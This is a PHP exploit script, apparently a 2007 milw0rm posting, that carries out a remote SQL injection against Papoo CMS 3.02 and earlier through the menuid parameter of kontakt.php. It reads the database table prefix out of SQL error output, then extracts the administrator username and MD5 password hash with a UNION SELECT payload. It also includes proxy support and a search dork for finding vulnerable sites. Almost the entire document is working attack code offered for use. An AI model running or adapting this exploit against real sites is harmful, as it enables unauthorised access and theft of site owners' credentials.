<?
/*
Autor: Kacper
Contact: kacper1964@yahoo.pl
Homepage: http://www.rahim.webd.pl/
Irc: irc.milw0rm.com:6667 #devilteam 

Pozdro dla wszystkich z kanalu IRC oraz forum DEVIL TEAM.

//dork: "Help * Contact * Imprint * Sitemap" | "powered by papoo" | "powered by cms papoo"

Papoo <= 3.02 (kontakt menuid) Remote SQL Injection Exploit
script homepage/download/demo: http://www.papoo.de/
*/
if ($argc<4) {
print_r('
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Usage: php '.$argv[0].' host path userid OPTIONS
host:       target server (ip/hostname)
path:       papoo path
userid:     User ID
Options:
 -X[prefix]:  PAPOO database columns prefix
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
Example:
php '.$argv[0].' 127.0.0.1 /papoo/ 10
php '.$argv[0].' 127.0.0.1 /papoo/ 10 -Xpapoo
php '.$argv[0].' 127.0.0.1 /papoo/ 10 -P1.1.1.1:80
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
');
die;
}
error_reporting(7);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);
function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function wyslijpakiet($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    $parts[1]=(int)$parts[1];
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

$host=$argv[1];
$path=$argv[2];
$userid=$argv[3];
$port=80;
$proxy="";
for ($i=4; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if ($temp=="-p")
{
  $port=(int)str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
if ($temp=="-X")
{
  $prefix=str_replace("-X","",$argv[$i]);
}
}
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {die("Bad path!");}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
function sprawdz($hash)
{
 if (ereg("^[a-f0-9]{32}",trim($hash))) {return true;}
 else {return false;}
}
function char_convert($my_string)
{
  $encoded="CHAR(";
  for ($k=0; $k<=strlen($my_string)-1; $k++)
  {
    $encoded.=ord($my_string[$k]);
    if ($k==strlen($my_string)-1) {$encoded.=")";}
    else {$encoded.=",";}
  }
  return $encoded;
}
if (isset($prefix)) {
    echo "Prefix: ".$prefix."\r\n";
}
if ($prefix=="")
{
  $packet="GET ".$p."kontakt.php?menuid=-1)+ HTTP/1.0\r\n";
  $packet.="Host: ".$host."\r\n";
  $packet.="Connection: Close\r\n\r\n";
  wyslijpakiet($packet);
  if (strstr($html,"You have an error in your SQL syntax"))
  {
    $temp=explode("_papoo_collum3",$html);
    $temp2=explode("SELECT article FROM ",$temp[0]);
    $prefix=$temp2[count($temp2)-1];
    echo "prefix: ".$prefix."\n";
  }
  else
  {die("Unable to disclose table prefix...\n");}
}

print "Papoo <= 3.02 (kontakt menuid) Remote SQL Injection Exploit by Kacper\r\n";
$packet ="GET ".$p."kontakt.php?menuid=-1)+union+select+CONCAT(".char_convert("<!--[#").",username,CHAR(58),password,".char_convert("#]-->").")+from+".$prefix."_papoo_user+WHERE+userid=".$userid."/* HTTP/1.0\r\n";
$packet.="Referer: http://".$host.$path."kontakt.php\r\n";
$packet.="Accept-Language: pl\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
wyslijpakiet($packet);
sleep(3);
$temp=explode('<!--[#',$html);
$temp2=explode('#]-->',$temp[1]);
for ($i=1; $i<=count($temp)-1; $i++)
{
 $temp2=explode(":",$temp[$i]);
 if (sprawdz($temp2[1]))
 {
  echo "admin          => ".$temp2[0]."\n";
  echo "password (md5) => ".$temp2[1]."\n";
  die;
 }
}
echo "Script is not vulnerability ;(\r\n";
?>

# milw0rm.com [2007-04-15]
